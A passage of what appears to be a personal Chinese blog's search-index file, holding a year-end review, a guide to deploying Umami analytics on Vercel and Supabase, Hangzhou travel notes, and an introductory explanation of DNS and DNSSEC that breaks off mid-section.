checked="" disabled="" type="checkbox"> 第九章 互联网安全技术 课后2</li><li><input checked="" disabled="" type="checkbox"> 第十章 虚拟专用网络VPN 技术</li><li><input checked="" disabled="" type="checkbox"> 第十章 虚拟专用网络VPN 技术 课后</li><li><input checked="" disabled="" type="checkbox"> 第十一章 入侵检测技术</li></ul><h2 id="学习清单"><a href="#学习清单" class="headerlink" title="学习清单"></a>学习清单</h2><ul><li><input checked="" disabled="" type="checkbox"> 网络协议</li><li><input checked="" disabled="" type="checkbox"> 网络协议分层</li><li><input disabled="" type="checkbox"> PPP 协议</li><li><input disabled="" type="checkbox"> 以太网协议</li><li><input disabled="" type="checkbox"> 硬件设备</li><li><input checked="" disabled="" type="checkbox"> ARP</li><li><input checked="" disabled="" type="checkbox"> IP 分片</li><li><input checked="" disabled="" type="checkbox"> IP 校验和</li><li><input checked="" disabled="" type="checkbox"> IP 5类地址类型</li><li><input checked="" disabled="" type="checkbox"> 根据掩码与 IP 地址求子网地址范围</li><li><input checked="" disabled="" type="checkbox"> 有关子网的计算</li><li><input checked="" disabled="" type="checkbox"> 子网划分（定长划分、变长划分）</li><li><input checked="" disabled="" type="checkbox"> IP 选路（直接、间接交付）</li><li><input checked="" disabled="" type="checkbox"> 路由表的设计</li><li><input disabled="" type="checkbox"> 路由聚合</li><li><input checked="" disabled="" type="checkbox"> RIP协议（协议原理、路由表更新方法）</li><li><input checked="" disabled="" type="checkbox"> OSPF 协议（协议原理、最短路径优先算法、分层路由与5类链路通告）</li><li><input disabled="" type="checkbox"> 出错控制</li><li><input checked="" disabled="" type="checkbox"> 流量控制</li><li><input checked="" disabled="" type="checkbox"> 拥塞控制</li><li><input checked="" disabled="" type="checkbox"> 连接管理</li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年终总结</title>
      <link href="/2023/12/25/2023/year-end-review/"/>
      <url>/2023/12/25/2023/year-end-review/</url>
      
        <content type="html"><![CDATA[<p><img src="https://img.ma5hr00m.top/blog/20231230134727.png" alt="20231230134727"></p><blockquote><p>从平安夜就计划着要写，一直拖到31号才动笔，该治治拖延症了 :(</p></blockquote><p>总得来说，今年变化挺大的。</p><h2 id="走出三点一线，不再自闭！"><a href="#走出三点一线，不再自闭！" class="headerlink" title="走出三点一线，不再自闭！"></a>走出三点一线，不再自闭！</h2><p>首先呢，稍微变得外向了。自己都能感受到自己在走出自闭的圈子（这对于一个社恐来说真的是能排到首位的事情）。</p><p>阿菇以前说话结巴很严重，有时候想了很久话到嘴边说不出来，也有时候话不过脑子就动嘴，不知道自己说了什么，同时说话的时候基本丧失五感。<br>与别人交流起来比较困难。<br>不知道是出于什么原因，各种杂七杂八的因素都有点吧，可能是因为以前性格太闷了，说话都不多。</p><p>2023年的我在努力克服这一点。<br>包括与室友聊天、课业组队、社团交际等，相比与高中时期，大大增加的社交给了阿菇充足的练嘴皮子的机会。<br>变化真的蛮大的，大到，可能去年的阿菇看到今年的我，都会愣一下？</p><p>另一方面，出于多与人交流的想法，同时也觉得该改变现状了，阿菇偶尔会离开三点一线的生活，四处逛逛（杭州也比较适合）。<br>以前就是纯闷在寝室&#x2F;家，现在逐渐喜欢上这种到处跑的感觉。比较有新鲜感，能观察一些屏幕前注意不到的东西。</p><blockquote><p>但说实话，依然很难有那种 <em>“啊，我欣赏到了美景，很幸运能来到此地”</em> 的想法，与个人品性有关？或许阿菇天生是个宅宅。</p></blockquote><h2 id="看动漫的心或许不再纯粹……"><a href="#看动漫的心或许不再纯粹……" class="headerlink" title="看动漫的心或许不再纯粹……"></a>看动漫的心或许不再纯粹……</h2><p>首次摆脱中学压力，阿菇掌握自己时间的分配，可以肆意地了解自己感兴趣的知识，休息时间也能敞开了看自己喜欢的动漫。</p><p>但阿菇发现，自己很难“沉入”进动漫当中了，更多的时候是在以一个观察者的视角在“看自己看动漫”。</p><p>这说法或许很怪。</p><p>以前就有在模模糊糊地意识到，阿菇在看动漫的时候，脑子似乎有自己的想法，就那种有片思绪会飘出来，然后在我看动漫的时候反复强调：“啊，这个镜头怎么怎么样，制作的时候阿巴阿巴”、“这个分镜是想引导观众怎样怎样”、“这个时候你应该想xxx，而不是xxx，大家会这样想而不是xxx”……</p><p>就类似不自觉地进行点评，点评作品本身以及自己在看作品时的想法，以及脑补别人在看这个片段时的想法，而不是向以前一样产生带入感。</p><p>倒也说不上是打分，但肯定会有一个很明显的对比的心态，会将刚看的作品和之前看到的xxx进行比对，再将自己观看时的状态与我认为的 <em>“别人观看时的状态做比对”</em>。</p><p>举个例子，这两天云玩了《三伏》，走了遍剧情，全看完后第一反应是后半段什么狗屎剧情，一个反派大杀特杀，前半段的部分人设烂掉了；过会儿脑子会做个纠正，告诉自己总体剧情也能接受，不是作品烂，不过是be导致短时间的情绪失衡（一般只接受he作品），不能否认作品本身；然后细想又不对，还是剧情狗屎的原因，自己心里打个分，然后去找其他平替结局；然后看完粉丝改的he结局再掉过头看原作结局，又觉得存在一定合理性……之后就反复拉扯，会在心里一遍一遍过剧情、打分，有时候就会觉得看作品挺累的……</p><blockquote><p>这也能解释为什么阿菇喜欢看糖水动漫？</p></blockquote><p>找不回以前那种看动漫时会将自己带入进故事的感受了。</p><h2 id="技术力-up-up"><a href="#技术力-up-up" class="headerlink" title="技术力 up up ~"></a>技术力 up up ~</h2><p>呃啊啊，技术能力得到提升。虽然觉得提升不多，但相比年初还是强了不少。</p><p>主要集中在Web开发方面吧，现在撸个Web站点已经不是麻烦了，基本都取决于想不想做，懒惰成为了项目开发的最大阻力。</p><p>眼界也提升不少，在技术社区挖宝也是一种快乐的体验，之前以为很高深的技术现在也变的触手可及。<br>唔，或者说本来就触手可及，以前只是害怕去了解，总是觉得自己掌握得还不够。</p><p>但，总得有个开始，只要上手接触，就会发现实现功能并不是很难的事情。<br>学技术的难度总是小于接触技术的难度。</p><p>深切地体会到“万事开头难”。</p><p>除了 coding 方面，设计方面也有了显著提升。虽然没正经的上过什么课，但东一耙子、西一耙子练出来的艺术感与审美也是够用了。</p><p>略有遗憾的就是，懒阿菇在今年没怎么练习过绘画，明年要捡起来！</p><h2 id="近况。"><a href="#近况。" class="headerlink" title="近况。"></a>近况。</h2><p>抱恙，健康状况出了点小问题，年末基本是在休息与摆烂中度过的。</p><p>把 VImage 变成了创新实践期末作业，通过添加ddl的方式来提升自己的开发进度，已经鸽了快4个月了。ddl不愧是第一生产力！</p><p>年末美工该发力了，准备鼓捣鼓捣出些周边。</p><p>除此之外，最近开始接触Vtuber了。观察观众们与Vtuber之间的互动，很有趣，也会感觉Vtuber打工的真地很卖力，大多数人或许干不了这一行。</p><p>这学期预选了很多大三必修课，感觉会有一场恶战。不要屈服口牙！</p><h2 id="2024年要干些什么呢？"><a href="#2024年要干些什么呢？" class="headerlink" title="2024年要干些什么呢？"></a>2024年要干些什么呢？</h2><ol><li><p>大方向转到Web安全，偏移重心。<br>多打比赛多复现，在知识星球等平台上也多关注最新的漏洞。<br>明年的HGAME也要出题做做贡献。</p></li><li><p>开发能力继续提升，做出自己想要的网站、写出优美的页面依然是能令我非常开心的事情。现在手上有两个项目：</p><ul><li>VImage</li><li>Manga Recoder</li></ul></li><li><p>设计能力就算在上一条了。也要练习画画，看看能坚持多久。总体上来说，能另我开心的、我需要的都还是内容输出能力，搞开发和绘画都是表现形式罢了。</p><ul><li>HGAME2024周边</li><li>Vidar娘光标美化包</li></ul></li><li><p>多出去走走、增强沟通交流能力，尽可能改变过”宅“的现状。</p></li><li><p>坚持锻炼，总能给自己找到锻炼的理由，生活也要更加规律一些。</p></li></ol><h2 id="明年再见！"><a href="#明年再见！" class="headerlink" title="明年再见！"></a>明年再见！</h2><p>以上。</p><p>这一年总体来说挺不错的，阿菇很开心，虽说仍有不如意的地方，但还是要给自己鼓掌。希望2023年的阿菇摆脱心理上给自己的束缚，更加遵从自己的内心！</p><p>撒由那啦，2023。</p><p>:::info<br>今天晚上就看看B站跨年晚会吧，虽然没做期待。<br>:::</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Year Review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Supabase&amp;Vercel部署Umami</title>
      <link href="/2023/12/17/2023/supabase-vercel-umami/"/>
      <url>/2023/12/17/2023/supabase-vercel-umami/</url>
      
        <content type="html"><![CDATA[<p>年末，云服务器快到期了，正好赶上腾讯云年底促销，118￥&#x2F;年 2核2G云服务器，就租了台。</p><p>但是，我的umami网站数据统计服务运行在旧服务器的docker容器中，迁移有点麻烦，就想着干脆在第三方平台部署一个吧，免得以后更换云服务器还得迁移来迁移去的。这里写篇博客记录使用vercel+supabase部署umami服务的过程。</p><h2 id="umami"><a href="#umami" class="headerlink" title="umami"></a>umami</h2><p>开始之前，先说说umami是什么，我们为什么需要它。</p><p>umami是一个轻量级的网站访问统计工具，开源免费，可自托管，用途类似 <a href="https://analytics.google.com/">Google Analytics</a>。</p><p>相比老牌Google Analytics，umami的主要优势在于其对用户隐私的关注和资源占用的低占用。它不使用cookie，不跟踪用户，且所有收集的数据都会匿名化处理，符合GDPR政策。此外，umami的所有数据都存储在自己的数据库中，不用担心数据被第三方平台进行算法优化、用户建模等。</p><p>umami的功能虽然没有Google Analytics那么丰富，但如果你的需求不多，只想了解网站的访问量（PV、UV）、流量来源等基本信息，以及记录一些简单的自定义事件，那么Umami会是一个不错的选择。</p><p>而且，umami的文档编写的十分详细，并且详细讲解了在多数云平台中应该如何配置一个umami服务，这点非常棒。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>github帐号</li><li>vercel帐号（支持github认证登录）</li><li>supabase帐号（支持github认证登录）</li></ul><p>Vercel是一个面向现代前端项目的部署平台，它提供了快速、简单的部署流程，适用于静态网站、单页面应用和服务器端渲染应用。Vercel支持自动化部署、全球性能优化和无缝的集成，使开发人员能够专注于构建用户界面而不必担心基础架构。</p><p>Supabase是一个开源的后端即服务（BaaS）平台，它基于PostgreSQL数据库构建，提供了身份验证、实时订阅、文件存储等功能。Supabase旨在为开发人员提供可扩展的后端解决方案，使他们能够快速构建应用程序而无需花费大量时间在后端开发上。</p><h2 id="部署流程"><a href="#部署流程" class="headerlink" title="部署流程"></a>部署流程</h2><p>第一步，访问<a href="https://github.com/umami-software/umami">umami官方仓库</a>，Fork一份代码到自己的仓库中。</p><p>第二步，访问supabase，点击<code>New Project</code>创建一个</p><p><img src="https://img.ma5hr00m.top/blog/20231219091327.png" alt="supabase create new project"></p><p>成功创建项目，点击<code>SQL editor</code>按钮，页面跳转后点击<code>+ New query</code>按钮，在文本框中输入 <a href="https://github.com/umami-software/umami/blob/master/db/postgresql/migrations/01_init/migration.sql">umami官方postgresql初始化脚本</a> 中的SQL语句，然后运行，在控制台输出<code>Success. No rows returned</code>即成功。</p><p><img src="https://img.ma5hr00m.top/blog/20231219091713.png" alt="postgresql init success"></p><p>然后，按照下图中的顺序找到刚创建的这个umami postgresql服务的URI参数（记得替换成YOUR_PASSWORD），并记录下来，一会儿要用。</p><p><img src="https://img.ma5hr00m.top/blog/20231219092709.png" alt="supabase params"></p><p>第三步。访问vercel，点击<code>Add New Project</code>，选中第一步中Fork的umami仓库，点击<code>import</code>，然后开始配置环境变量。</p><p>只需要配置两个环境变量字段：<code>HASH_SALT</code>对应一个由英文组成的字符串，闭着眼对键盘乱敲就行；<code>DATABASE_URL</code>对应后端服务URL，就是第二步最后记录的参数。</p><p><img src="https://img.ma5hr00m.top/blog/20231219092920.png" alt="vercel set params"></p><p>配置完成后点击<code>Deploy</code>，稍等片刻，即可看到部署成功的欢迎页面，此时就能登录分配给你链接使用刚部署的umami服务了！记得更改默认密码。</p><p>:::warning<br>在这一步，你很有可能会发现Vercel Build Project失败，并抛出<code>Error: P3005</code>报错。</p><p>解决方法就在下面。</p><p>:::</p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题<Badge type="tip" text="umami v2 专享" /></h2><p>Build项目时会出错，查看日志，关键报错信息如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error: P3005</span><br><span class="line"></span><br><span class="line">The database schema is not empty. Read more about how to baseline an existing production database: https://pris.ly/d/migrate-baseline</span><br></pre></td></tr></table></figure><p>这个问题会在umami v2中碰到。我写这篇博客时umami的版本是<code>v2.9.0</code>，也遇到了这个问题。翻找官方仓库的issue，果然有收获：<a href="https://github.com/umami-software/umami/issues/2005">#2005</a>。</p><p>原理很简单，会出现这个报错的本质原因是umami v2使用了prisma作为数据库迁移工具，而prisma要求数据库模式是空的，否则会导致冲突。为了解决这个问题，可以参考一下方法：</p><ol><li>将你Fork的umami项目仓库clone到本地；</li><li>在你的umami项目中，创建.env文件，并在其中设置<code>DATABASE_URL</code>变量，该环境变量的值就是supabase中刚创建数据库的URL；</li><li>在项目终端中依次运行以下三条指令：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br><span class="line">yarn build-db</span><br><span class="line">npx prisma migrate resolve --applied 01_init</span><br></pre></td></tr></table></figure><p>解决问题的手法也很简单，就是先在本地使用prisma来同步umami的数据库模式和迁移，然后再在vercel上部署umami的服务。这样可以避免vercel在部署umami v2项目时出现报错的本质原因，即数据库模式不为空。</p><p>注意哦，这里的操作应该在第二步之后、第三步之前。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://route360.dev/en/post/umami-supabase/">How to run Umami Analytics + Supabase + Vercel for free</a>, by Route360</li></ul><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>跟着以上步骤走，可以零成本、轻松地部署自己的umami服务。如果你相对umami了解更多，包括怎么使用umami统计自己站点的数据，可以去看看官方文档，十分详细：<a href="https://umami.is/docs">umami Docs</a>。</p><p>以上。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Umami </tag>
            
            <tag> Self-hosting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭州小记·清河坊&amp;伍公山&amp;雷峰塔</title>
      <link href="/2023/12/11/2023/hangzhou-trip-02/"/>
      <url>/2023/12/11/2023/hangzhou-trip-02/</url>
      
        <content type="html"><![CDATA[<blockquote><p>社恐下定决心，把自己赶出了寝室……</p></blockquote><p>杭州是块风水宝地，旅游资源很充足，对来自北方小城市的孩子来说，去哪都是逛。</p><p>坐地铁做坐到 <em>安定路</em>，然后关掉导航，随机挑一个地铁口出去，开始闲逛。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文<Badge type="info" text="流水帐" /></h2><p>吴山，杭州人俗称 <em>城隍山</em>。它位于钱塘江北岸，西湖东南面，是西湖群山延伸进入市区的成片山岭（好像也是杭州城区内唯一的山头）。</p><p>我在街边溜达的时候看到个占地不大的花圃，或者说小公园？有一些人在里面拍照，就走进去看看。12月算是冬天了，花圃没什么观赏性，在里面转悠的时候看到个侧门，进去就是吴山广场，旁边就是熙熙攘攘的人群。</p><p><img src="https://img.ma5hr00m.top/blog/20231218223344.png" alt="吴山广场"></p><p>好像是有名为 <em>五谷丰登·囤货正当时</em> 的活动，行道两侧都是商贩，卖的都是常见的农产品、水产品，以及一些传统的零嘴。行人都是成家成户的，没多少像是游客的人，感觉多是附近的居民出来买东西。</p><p>顺着人流，走个几百米就是 <em>清河坊</em>。</p><p><img src="https://img.ma5hr00m.top/blog/20231218224325.png" alt="清河坊"></p><p>将近年末，没有共休假期，人流量不算很大，不用人挤人，逛得就很舒心。</p><p>与去过的景点做对比，清河坊和台儿庄古城有几分相似，都是一条街道，两边琳琅满目的商家。区别在风格上。同样是古城，清河坊以及周边的社区感觉是印象中的青砖灰瓦白墙，街道宽敞，搭配店面种类，能感觉到一种自古以来就很富饶的气息。而台儿庄古城就有种抗战的历史基调，没什么不好，但感觉略有点单调。</p><p>清河坊不算大，溜溜转转，看到了 <em>鼓楼</em>。</p><p><img src="https://img.ma5hr00m.top/blog/20231218225621.png" alt="鼓楼"></p><p>穿过鼓楼，就是普通市区，路对面还有条美食街。但没往美食街走。扭头进了旁边的小巷子，感受下生活气息。</p><blockquote><p>实际上是迷路了……</p></blockquote><p>在小巷子里走到底，感觉不太对劲，但高德地图导航又有些乱，索性掉头往回走。再穿过鼓楼，发现旁边有一条狭窄的石板路，通往山上，就踏着石板路向上走。</p><p><img src="https://img.ma5hr00m.top/blog/20231218230228.png" alt="上城煌山"></p><p>爬楼梯两三分钟就到顶了。山上相比清河坊人更少，稀稀拉拉的散着，感觉也没人会闲着没事儿往上走。看到块路牌，才知道这个山头是 <em>伍公山</em>。伍公，说的是伍子胥。</p><blockquote><p>伍子胥(前559~前484)。楚大夫伍奢之子，名员，字子胥，春秋时吴国的大夫。公元前522年，其父伍奢被杀，他逃亡经过宋、郑等国入吴。后帮公子光(即吴王阖闾)刺杀吴王僚，夺取王位，整军经武，国势日盛。不久攻破楚国，以功封于申，又称申胥。后吴王夫差时，劝王拒绝越国求和并停止伐齐，吴王不听，渐被疏远，最后吴王吴王夫差极怒，赐剑命他自杀。五月初五把伍子胥的尸首用鸱夷革裹着抛弃于钱塘江中，吴人哀怜他，为其在江边吴山东南一丘坡上立祠，后逐名为伍公山。</p></blockquote><p>到了伍公山，就去看看伍公庙。</p><p><img src="https://img.ma5hr00m.top/blog/20231218230733.png" alt="伍公庙"></p><p>走进庙中，由外及里依次看到三块牌匾——御香殿、忠清殿、潮神殿。忠清殿为整个庙宇正殿，殿前设有古朴的香炉，殿中有伍子胥的彩雕。潮神殿中有潮神的青铜像。侧殿中有古风图片介绍伍子胥的一生，图文并茂，比较有趣。</p><p>毕竟是秋冬季，庙里庙外很多植被都做了防寒处理，古木也都只剩光秃秃的树枝，没什么观赏性了。春夏季来应该会好看很多。</p><p>山其实并不高，但俯瞰山下街区还是足够了的。伍公庙侧门出去就能看到山下：</p><p><img src="https://img.ma5hr00m.top/blog/20231218232134.png" alt="伍公山上"></p><p>出了伍公庙继续在山顶转悠。人确实很少，基本都是老头老太太上山喝茶遛弯，凉风呼呼的（瑟瑟发抖）。</p><blockquote><p>看到有不少被白色塑料膜遮住的地方，大都是茶馆。</p></blockquote><p>走着走着，在一片空地（有很多树，感觉像那种专门看戏的场地）边上看到了 <em>湖山佳话</em> 的戏台：</p><p><img src="https://img.ma5hr00m.top/blog/20231219013920.png" alt="湖山佳话"></p><p>在戏台有手边，还有一个建筑：</p><p><img src="https://img.ma5hr00m.top/blog/20231219014240.png" alt="戏台右侧"></p><p>里面都是老人在活动腰腿，还供奉了一个什么天尊，没有细看。再往旁边走去，是一个直接从山顶通到清河坊的石板楼梯，中段还有个 <em>环翠楼</em>（实际更像是个亭子），亭角上还挂有风铃，风一吹就叮当作响，感觉很有意味：</p><p><img src="https://img.ma5hr00m.top/blog/20231219014533.png" alt="环翠楼"></p><p>另外石楼梯中段还有个卖饮品的小店，没进去。</p><p>我下了伍公山就直接走到清河坊边上的马路对侧，打开导航，租辆共享单车就往西湖骑。上个月来西湖没上雷峰塔，这次去一趟。</p><p>到了雷峰塔景区，学生票20&#x2F;成人票40，买票进去，直接仰视雷峰塔：</p><p><img src="https://img.ma5hr00m.top/blog/20231219020020.png" alt="雷峰塔景区门口"></p><p>从这张照片里也能看到，能直接坐扶梯到雷锋塔下的。阿菇很懒，选择坐扶梯上去了（反正都得走下来，能省点力省点力）。</p><p>历史上的古·雷峰塔早在1924年就塌了，仅存遗址，2002年在原址重建新塔。古雷峰塔的遗址也是对游客开放的。所以乘扶梯到塔底之后，我先去位于塔下面的遗址层看了看。</p><p>遗址分两层，中间是古塔移植，就是剩了些残破的砖头、台阶什么的，然后遗址层一圈的通道周围都有文物展出：</p><p><img src="https://img.ma5hr00m.top/blog/20231219021350.png" alt="雷峰塔遗址"><br><img src="https://img.ma5hr00m.top/blog/20231219021408.png" alt="雷峰塔部分文物展出"></p><p>出了遗址层，再往上一层，就是真·雷峰塔一层。同样的，雷锋塔有电梯和楼梯，游客可以直接乘直梯到塔顶。</p><p><img src="https://img.ma5hr00m.top/blog/20231219022035.png" alt="仰视雷峰塔"></p><p>不过阿菇这次没有坐直梯直接上去，而是走楼梯一点点看。</p><p>雷峰塔的入口，门上悬挂着书画家启功先生亲笔题写的“雷峰塔”三字金匾（后面还有“皇妃塔”的牌匾）。地面铺设着透明玻璃，下方是雷峰塔的遗址保护层，让人们能够近距离感受历史的沉淀。</p><p>二三四层是文物展示，是些木雕、画作什么的，说实话欣赏不来，只能感觉做的很精细。</p><p><img src="https://img.ma5hr00m.top/blog/20231219023015.png" alt="水漫金山木雕图"></p><p>最后是顶层。雷峰塔第五层有运用精湛贴金艺术制成的金色穹顶，穹顶中心是一朵硕大的莲花，配合灯照感觉是有点效果的。</p><p><img src="https://img.ma5hr00m.top/blog/20231219024354.png" alt="雷峰塔金色穹顶"></p><p>然后就是拍拍拍。雷锋塔顶是西湖风景区的制高点了，可以俯瞰西湖。可惜的是阴天，云层比较厚。</p><p><img src="https://img.ma5hr00m.top/blog/20231219024506.png" alt="20231219024506"><br><img src="https://img.ma5hr00m.top/blog/20231219024513.png" alt="20231219024513"><br><img src="https://img.ma5hr00m.top/blog/20231219024523.png" alt="20231219024523"></p><p>上雷锋塔顶最大的感受就是——明确地感受到自己怕高。17号风挺大的，再加上塔顶露台的围栏不高（也就到我腰），我是真的不怎么敢靠栏杆边上，在露台的时候是真的全程贴着墙。恐高啊～</p><p>Σヽ(ﾟД ﾟ; )ﾉ</p><p>拍了会儿照就直接坐电梯下来了，然后围着雷峰塔转两圈。看了看周边的其他建筑，比如佛舍利。</p><p>之后就没了，天色渐暗，因为是阴天也看不到雷峰夕照的景色，气温也嘎嘎降低，之后就做地铁会学校了。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>偶尔出学校溜达，看看景色还是挺不错的，尤其是这种天气，白天不热，徐徐凉风，走路也不会出汗。也不是旅游旺季，游客少，不用看人头。</p><p>然后是16号下过一场雨，空气中没什么浮尘，能见度非常好，很适合拍照。唯一可惜的就是阴天，夕阳中的雷峰塔没看到。</p><p>挺开心的，下次再去别的地方逛逛。结束。</p><p><img src="https://img.ma5hr00m.top/blog/20231219030003.png" alt="重云下的雷峰塔"></p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Travel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSSEC安全拓展</title>
      <link href="/2023/12/04/2023/dnssec/"/>
      <url>/2023/12/04/2023/dnssec/</url>
      
        <content type="html"><![CDATA[<p>网络安全技术理论课程的Topic主题，倒也是很有意思。</p><h2 id="脆弱的DNS"><a href="#脆弱的DNS" class="headerlink" title="脆弱的DNS"></a>脆弱的DNS</h2><p>DNS（Domain Name System）是一种用于将易于理解的域名转换为计算机可读的IP地址的系统。<br>从其功能来说，它就像互联网中的“电话簿”，通过管理域名和IP地址之间的映射关系，使得计算机和其他网络设备能够相互通信。</p><p>举个例子：用户在浏览器中访问一个域名，比如<code>ma5hr00m.top</code>，需要先知道这个域名对应的IP地址，计算机通过DNS查询到域名对应的IP地址是<code>101.35.240.239</code>，它就会与这个IP对应的机器通信。</p><p>更详细地说“通过DNS查询到域名对应的IP”这个过程：DNS系统由多个层级的域名服务器组成，这些服务器相互协作来处理DNS查询。当用户在浏览器中输入域名并请求访问网站时，操作系统会向<em>本地DNS解析器</em>发出查询请求。如果本地解析器缓存了相应的IP地址，它会直接返回结果；否则，它会向互联网上的<em>根域名服务器</em>发出请求。根域名服务器会指导本地解析器到达<em>顶级域名服务器</em>，然后再到达<em>次级域名服务器</em>，直到找到负责特定域名的<em>权威域名服务器</em>。最终，权威域名服务器会返回所请求域名对应的IP地址，使得用户的设备能够连接到相应的服务器。</p><p>该流程可以总结成这张图，更好理解：</p><p><img src="https://img.ma5hr00m.top/blog/20231208062310.png" alt="DNS流程图"></p><p>现在我们知道什么是DNS了，那我们为什么需要DNS？因为直接记忆IP地址比较麻烦（尤其是IPV6出现之后），而有意义的字符串更方便记忆。<code>20.205.243.166</code>和<code>github.com</code>，我们愿意记哪一个呢？</p><p>我们可以使用<code>nslookup xxx.xxx</code>指令来查询域名对应的IP地址。该工具包含在<code>dnsutils</code>（Debian&#x2F;Arch）和<code>bind-utils</code>（CentOS&#x2F;RHEL）中。</p><p>DNS最早在1983年的<a href="https://datatracker.ietf.org/doc/html/rfc882">RFC 882</a>中定义，并提供了技术实现，现今已成为互联网的基础设施之一。但经过多年发展，互联网环境日趋复杂，远不像那个时代那般“单纯”，DNS的脆弱就体现出来了。</p><p>理由无他，DNS在设计之初就没有提供任何安全措施：基于UDP的明文数据传输、无身份验证、无数据完整性验证……如果我们仅使用传统的DNS协议，这无异于只穿条裤衩就上街。对于有心者，我们的数据一览无遗。</p><p>后世的人们自然也发现了这个问题，毕竟谁都不想让自己的数据裸奔。然后就出现了很多种解决方案，比如为DNS服务器添加入侵检测系统、设置DNS过滤器、对应的加密协议<code>DNS on TLS</code>……这其中，就包括DNS安全拓展，也就是DNSSEC。</p><h2 id="可靠的DNSSEC"><a href="#可靠的DNSSEC" class="headerlink" title="可靠的DNSSEC"></a>可靠的DNSSEC</h2><p>DNSSEC（Domain Name System Security Extensions）是一种用于增强域名系统（DNS）安全性的协议扩展，也就是由 IETF 提供的一套DNS安全认证机制（可参考<a href="https://tools.ietf.org/html/rfc2535">RFC 2535</a>）。它通过添加加密验证机制，防止DNS查询过程中的欺骗和篡改，确保用户访问的网站和服务器是合法和可信的。</p><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="新的DNS记录类型"><a href="#新的DNS记录类型" class="headerlink" title="新的DNS记录类型"></a>新的DNS记录类型</h3><p>DNSSEC通过向现有DNS记录添加加密签名，确保域名系统的安全性，这些数字签名与<code>A、AAAA、MX、CNAME</code>等常见记录类型一起存储在DNS名称服务器中。计算机可以通过检查相关签名，去验证请求的DNS记录是否来自权威名称服务器，以及有没有被篡改过。</p><ul><li>RRSIG：包含加密签名</li><li>DNSKEY：包含公共签名密钥</li><li>DS：包含DNSKEY记录的Hash</li><li>NSEC和NSEC3：用于明确否认DNS记录的存在</li><li>CDNSKEY和CDS：用于请求对父区域中的DS记录进行更新的子区域。</li></ul><p>先有个印象，下文细说，</p><h3 id="Resource-Record-Set"><a href="#Resource-Record-Set" class="headerlink" title="Resource Record Set"></a>Resource Record Set</h3><p>资源记录集，即RRSets。使用 DNSSEC 保护某个区域的第一步，是将所有相同类型的记录分组到一个RRSets中，也就是进行分组。</p><p>比如，example.com域下有三条AAAA类型的记录，分别为：</p><ul><li><code>a.example.com 300 IN AAAA 2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></li><li><code>b.example.com 600 IN AAAA 2001:0db8:85a3:0000:0000:8a2e:0370:7335</code></li><li><code>c.example.com 900 IN AAAA 2001:0db8:85a3:0000:0000:8a2e:0370:7336</code></li></ul><div align="center">  <img style="width:100%;" src="https://img.ma5hr00m.top/blog/20231208073028.png" alt="KSK&ZSK"></div><p>我们可以将其捆绑到同一组中，这就是一个RRset。</p><h3 id="Zone-Singing-Key"><a href="#Zone-Singing-Key" class="headerlink" title="Zone-Singing Key"></a>Zone-Singing Key</h3><p>区域签名密钥，即ZSK。</p><p>DNSSEC中的每个区域都有一个ZSK。ZSK通常是RSA密钥对，包括公钥（公用）和私钥（专用）两部分，其中专用部分对区域中的每个RRset进行数字签名，而公共部分则验证签名。</p><p>为了启用DNSSEC，区域操作员需要使用ZSK专用部分为每个RRset创建数字签名，并将其作为<code>RRSIG</code>记录存储在名称服务器中，并将公用共用部分添加到<code>DNSKEY</code>记录中的名称服务器，使其可用。</p><p>当DNSSEC解析器请求特定的记录类型（例如 AAAA）时，名称服务器就返回相应的<code>RRSIG</code>。然后，解析器可以从名称服务器中提取包含ZSK共用部分的<code>DNSKEY</code>记录。就这样，RRset、RRSIG和公共ZSK将一同用于验证响应。</p><h3 id="Key-Singing-Key"><a href="#Key-Singing-Key" class="headerlink" title="Key-Singing Key"></a>Key-Singing Key</h3><p>密钥签名密钥，即KSK。</p><p>KSK验证<code>DNSKEY</code>记录的方式与上文ZSK保护RRset的方式相同：<br>使用KSK的私钥签署ZSK公钥（存储在 DNSKEY 记录中），并为其<code>DNSKEY</code>创建<code>RRSIG</code>；然后，计算机将KSK放入DNSKEY记录中。</p><p>就像公共ZSK一样，名称服务器将公共KSK发布在另一个<code>DNSKEY</code>记录中，而这就给计算机提供了上面显示的<code>DNSKEY</code>RRset。<br>公共KSK和公共ZSK均由私有KSK签名。然后，解析器就可以使用公共KSK来验证公共ZSK。</p><div align="center">  <img style="width:100%;" src="https://img.ma5hr00m.top/blog/20231208115854.png" alt="KSK&ZSK"></div><p>简单地说，KSK就是用于保护密钥的密钥。<br>ZSK负责保护RRset的安全，KSK负责保护ZSK的安全。<br>而KSK的主要作用是建立信任链，将父区域的信任传递给子区域。</p><h3 id="Delegation-Signer"><a href="#Delegation-Signer" class="headerlink" title="Delegation Signer"></a>Delegation 